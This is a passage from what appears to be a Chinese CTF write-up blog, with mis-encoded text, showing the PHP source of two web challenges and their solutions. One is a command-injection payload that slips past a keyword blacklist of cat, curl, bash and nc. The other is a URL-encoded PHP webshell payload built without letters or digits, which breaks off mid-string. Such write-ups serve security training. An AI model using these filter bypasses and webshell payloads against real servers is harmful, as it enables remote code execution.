class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">rev</span></code></pre><p>éšåå³å¯æ‹¿åˆ°flag</p><h3 id="WEB-WUSTCTFæœ´å®æ— åRevenge-Revenge"><a href="#WEB-WUSTCTFæœ´å®æ— åRevenge-Revenge" class="headerlink" title="WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge"></a>WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge</h3><p>æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ²¡æœ‰è¿™æ ·çš„æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'éé¢„æœŸä¿®å¤*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¿«åˆ°éæ´²äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é¢˜å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œåªæ˜¯æœ€åçš„å‘½ä»¤å¤šè¿‡æ»¤äº†ä¸€äº›ï¼Œç›´æ¥ç»™å‡ºpayloadï¼š</p><pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-ä½ å–å§"><a href="#WEB-ä½ å–å§" class="headerlink" title="WEB_ä½ å–å§"></a>WEB_ä½ å–å§</h3><p>æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'l'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'v'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'z'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blacklisted</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$code</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ç›´æ¥ç»™å‡ºPç¥çš„payload(æ— å­—æ¯æ•°å­—çš„RCE)ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p>GETï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token 